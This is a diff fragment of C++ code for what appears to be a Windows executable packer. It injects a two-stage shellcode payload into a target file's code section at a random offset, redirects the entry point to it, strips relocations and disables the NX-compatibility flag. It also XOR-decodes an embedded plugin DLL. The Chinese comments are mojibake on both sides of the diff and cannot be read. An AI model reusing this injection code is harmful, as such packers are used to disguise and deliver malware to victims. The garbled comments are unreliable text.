+    å†µï¼Œå°½ç®¡ç”±äºå–æ¨¡è¿ç®—ï¼Œé›¶å€¼å®é™…ä¸Šä¸ä¼šç›´æ¥äº§ç”Ÿï¼Œä½†æ¥è¿‘é›¶çš„å°å€¼ä»å¯èƒ½å¯¼è‡´ç©ºé—´ä¸è¶³çš„é—®é¢˜ï¼Œé™¤éæœ‰é¢å¤–çš„æ£€æŸ¥ï¼‰ã€‚
 
     */
     int random = shellcode.size() + (rand() % (code_section.get_raw_data().size() - shellcode.size()));
@@ -389,14 +389,14 @@ bool build_packfile(const std::string& target_file_path,
     share.stub_entry_rva = sizeof(share_data_t) + stage_1_payload.size();
 
     // shellcode.data() = share + stage_1_payload + stage_2_payload;
-	memcpy((void*)shellcode.data(), &share, sizeof(share));
-	memcpy((unsigned char*)shellcode.data() + sizeof(share), stage_1_payload.data(), stage_1_payload.size());
-	memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(), stage_2_payload.data(), stage_2_payload.size());
+    memcpy((void*)shellcode.data(), &share, sizeof(share));
+    memcpy((unsigned char*)shellcode.data() + sizeof(share), stage_1_payload.data(), stage_1_payload.size());
+    memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(), stage_2_payload.data(), stage_2_payload.size());
 
-    //Çå¿Õ´úÂë¶Î
+    //æ¸…ç©ºä»£ç æ®µ
     //memset((void*)new_image.get_image_sections().front().get_raw_data().data(), 0xCC, code_section.get_raw_data().size());
 
-    // ÑéÖ¤µ¼Èë±íÔÚimageµÄÓĞĞ§½ÚÇøÄÚ£¬²¢½«imageÖĞµÄµ¼Èë±íÊı¾İ¸´ÖÆµ½new_imageÖĞµÄ¶ÔÓ¦Î»ÖÃ¡£
+    // éªŒè¯å¯¼å…¥è¡¨åœ¨imageçš„æœ‰æ•ˆèŠ‚åŒºå†…ï¼Œå¹¶å°†imageä¸­çš„å¯¼å…¥è¡¨æ•°æ®å¤åˆ¶åˆ°new_imageä¸­çš„å¯¹åº”ä½ç½®ã€‚
     if (image.get_image_sections().front().get_virtual_address() <= image.get_directory_rva(pe_win::image_directory_entry_import)
         && image.get_directory_rva(pe_win::image_directory_entry_import) <= image.get_image_sections().front().get_virtual_size())
     {
@@ -407,12 +407,12 @@ bool build_packfile(const std::string& target_file_path,
             text.get_raw_data().size() - (image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address()));
     }
 
-	//Ğ´ÈëÄ¿±êÎÄ¼ş´úÂë¶Î
-	memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random), shellcode.data(), shellcode.size());
+    //å†™å…¥ç›®æ ‡æ–‡ä»¶ä»£ç æ®µ
+    memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random), shellcode.data(), shellcode.size());
 
     new_image.set_ep(new_image.get_image_sections().front().get_virtual_address() + random + offsetof(share_data_t, eip_opcode));
 
-    //¹Ø±ÕÖØ¶¨Î»
+    //å…³é—­é‡å®šä½
     new_image.set_characteristics_flags(pe_bliss::pe_win::image_file_relocs_stripped);
     new_image.clear_characteristics_flags(pe_bliss::pe_win::image_dllcharacteristics_nx_compat);
 
@@ -423,10 +423,10 @@ bool build_packfile(const std::string& target_file_path,
     std::ofstream new_pe_file(output_file_path.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
     if (new_pe_file.is_open() == false)
     {
-        std::cerr << "ÎÄ¼şÕ¼ÓÃ" << std::endl;
+        std::cerr << "æ–‡ä»¶å ç”¨" << std::endl;
         return false;
     }
-        
+
     rebuild_pe(new_image, new_pe_file);
     new_pe_file.close();
 
@@ -459,5 +459,5 @@ void expand_cache_dll(const std::string& src, const std::string& dst)
         xor_buffer(plugin.data.data(), plugin.data.size(), kProtocolXorKey);
     }
     std::ofstream output(dst, std::ios::out | std::ios::binary);
-    output.write((char*)plugin.data.data(), plugin.data.size()); 
+    output.write((char*)plugin.data.data(), plugin.data.size());
 }
